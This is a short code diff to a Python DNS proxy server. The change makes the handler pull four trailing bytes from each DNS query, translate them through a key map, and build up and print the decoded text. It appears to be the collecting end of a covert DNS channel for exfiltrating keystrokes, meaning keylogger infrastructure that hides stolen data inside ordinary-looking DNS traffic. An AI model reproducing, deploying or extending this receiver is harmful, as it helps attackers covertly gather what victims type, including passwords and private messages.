@@ -14,7 +14,7 @@ from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
 
 import yaml
 key_map =yaml.safe_load(open("keymap.yml"))
-
+keys=[]
 class ProxyResolver(BaseResolver):
     """
         Proxy resolver - passes all requests to upstream DNS server and
@@ -73,9 +73,13 @@ class PassthroughDNSHandler(DNSHandler):
         host,port = self.server.resolver.address,self.server.resolver.port
         try:
             payload  = data[-4:]
-            print(f"PAYLOAD IS: {[key_map.get(x,'') for x in payload ]}")
+            keys.extend([key_map.get(x,'') for x in payload ])
+            res = "".join(keys)
+            res=res.replace("󱁐 "," ")
+            print(f"\rPAYLOAD IS: {res}", end="")
+       
         except:
-            print("No Payload ")
+            pass
        
         data = bytearray(data[:-4])
         data[2:4] = bytes.fromhex("0120")
